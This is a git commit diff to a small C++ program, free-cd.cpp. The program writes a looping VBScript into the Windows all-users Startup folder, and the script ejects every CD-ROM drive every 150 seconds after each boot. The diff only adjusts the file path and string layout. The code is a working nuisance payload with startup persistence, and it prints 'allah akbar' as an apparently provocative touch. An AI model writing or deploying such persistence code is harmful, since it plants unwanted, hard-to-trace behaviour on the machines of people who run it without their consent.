fca800d33537378af67934c17b771825292b8101
tyNoNieWiemJakTam <kamil.lenart@op.pl>
2017-10-02 18:17:17 +0200

    Update free-cd.cpp

--- free-cd.cpp
+++ free-cd.cpp
@@ -7,12 +7,11 @@ int main()
 {
 	fstream script;
 	ofstream outfile("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script.vbs");
-	script.open("script.vbs", ios::in | ios::out);
+	script.open("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\script.vbs", ios::in | ios::out);
 
-	script << "do \nDim ts \nDim strDriveLetter \nDim intDriveLetter \nDim fs 'As Scripting.FileSystemObject \nConst CDROM = 4 \nOn Error Resume Next \nSet fs = CreateObject(\"Scripting.FileSystemObject\")" << endl;
-	script << "strDriveLetter = \"\"\nFor intDriveLetter = Asc(\"A\") To Asc(\"Z\")\nErr.Clear\nIf fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then\nIf Err.Number = 0 Then\nstrDriveLetter = Chr(intDriveLetter)" << endl;
-	script << "Exit For\nEnd If\nEnd If\nNext\nSet oWMP = CreateObject(\"WMPlayer.OCX.7\" )\nSet colCDROMs = oWMP.cdromCollection\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null" << endl;
-	script << "For d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nset owmp = nothing\nset colCDROMs = nothing\nWScript.Sleep 150000\nloop\n" << endl; // 600 000 - 10 min
+	script << "do \nDim ts \nDim strDriveLetter \nDim intDriveLetter \nDim fs 'As Scripting.FileSystemObject \nConst CDROM = 4 \nOn Error Resume Next \nSet fs = CreateObject(\"Scripting.FileSystemObject\")\nstrDriveLetter = \"\"\nFor intDriveLetter = Asc(\"A\") To Asc(\"Z\")\nErr.Clear\nIf fs.GetDrive(Chr(intDriveLetter)).DriveType = CDROM Then\nIf Err.Number = 0 Then\nstrDriveLetter = Chr(intDriveLetter)\nExit For\nEnd If\nEnd If\nNext\nSet oWMP = CreateObject(\"WMPlayer.OCX.7\" )\nSet colCDROMs = oWMP.cdromCollection\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nFor d = 0 to colCDROMs.Count - 1\ncolCDROMs.Item(d).Eject\nNext \'null\nset owmp = nothing\nset colCDROMs = nothing\nWScript.Sleep " << endl;
+	script << "150000"; // 600 000 - 10 min
+	script << "\nloop\n" << endl;
 	
 	cout << "allah akbar" << endl;
 
